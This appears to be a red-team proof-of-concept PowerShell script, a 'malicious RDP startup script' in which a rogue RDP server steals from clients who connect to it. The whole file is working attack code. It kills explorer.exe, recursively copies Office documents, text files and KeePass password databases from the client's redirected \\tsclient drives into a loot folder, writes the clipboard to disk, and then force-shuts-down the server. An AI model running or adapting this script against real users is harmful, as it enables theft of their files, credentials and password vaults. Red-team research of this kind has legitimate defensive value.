#####################################
#                                   #
#               POC                 #
#  Malicious RDP Startup Script.    # 
#         Atea Red Team             #
#        atea-redteam.com           #
#                                   #
#####################################

$LootDir = "c:\StolenData"
$revHost = "172.16.1.123"
$revPort = "12345"

# Mimimize all windows First!
(New-Object -ComObject Shell.Application).MinimizeAll()
#Kill Explorer!
taskkill /f /im explorer.exe



#Steal Files!

function Backup-RemoteMappedFiles {
    param (
        [string]$BackupPath
    )

    # Get all paths starting with \\tsclient using net use
    $tsclientPaths = net use | Select-String "\\\\tsclient" | ForEach-Object {
        $_ -match "(\\\\tsclient\\\S+)" | Out-Null
        $matches[0]
    }

    # Copy files with specified extensions from \\tsclient paths and their subdirectories
    foreach ($path in $tsclientPaths) {
        if (Test-Path $path) {
            $files = Get-ChildItem -Path $path -Recurse -Include *.xls, *.xlsx, *.doc, *.docx, *.txt, *.kdb, *.kdbx -File -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                $relativePath = $file.DirectoryName.Substring($path.Length).TrimStart("\")
                $destinationPath = Join-Path -Path $BackupPath -ChildPath $relativePath

                # Create destination folder if it does not exist
                if (-not (Test-Path -Path $destinationPath)) {
                    New-Item -Path $destinationPath -ItemType Directory | Out-Null
                }

                # Copy the file to the backup location
                Copy-Item -Path $file.FullName -Destination $destinationPath -Force
            }
        }
    }

    Write-Host "Backup from \\tsclient paths completed."
}

function Backup-UserFiles {
    param (
        [string]$BackupPath
    )

    
    $files = Get-ChildItem -Path \\tsclient\C\Users\ -Recurse -Include *.xls, *.xlsx, *.doc, *.docx, *.txt, *.kdb, *.kdbx -File -ErrorAction SilentlyContinue
    foreach ($file in $files) {
        $relativePath = $file.DirectoryName.Substring($path.Length).TrimStart("\")
        $destinationPath = Join-Path -Path $BackupPath -ChildPath $relativePath

        # Create destination folder if it does not exist
        if (-not (Test-Path -Path $destinationPath)) {
            New-Item -Path $destinationPath -ItemType Directory | Out-Null
        }

        # Copy the file to the backup location
        Copy-Item -Path $file.FullName -Destination $destinationPath -Force
    }

    

    Write-Host "Backup from \\tsclient paths completed."
}


# RUN IT! 
# On All files?
#Backup-RemoteMappedFiles -BackupPath $LootDir
# On only users files:
Backup-UserFiles -BackupPath $LootDir


## Steal Clipboard Data:
function Write-ClipboardToDisk {
    param (
        [string]$OutputFilePath = "C:\StolenData\clipboard.txt" # Specify the output file path
    )

    try {
        # Get the clipboard content
        $clipboardContent = Get-Clipboard

        if (-not $clipboardContent) {
            Write-Host "Clipboard is empty or could not be read."
            return
        }

        # Write the clipboard content to the specified file
        Set-Content -Path $OutputFilePath -Value $clipboardContent -Force
        Write-Host "Clipboard content successfully written to $OutputFilePath"
    }
    catch {
        Write-Host "Failed to read clipboard data: $_"
    }
}

# Example usage:
Write-ClipboardToDisk -OutputFilePath "C:\StolenData\clipboard.txt"



# This is a one time shot server, so we will kill it!
# Kill the server (change /s to /l if only logoff needed)
shutdown.exe /s /f



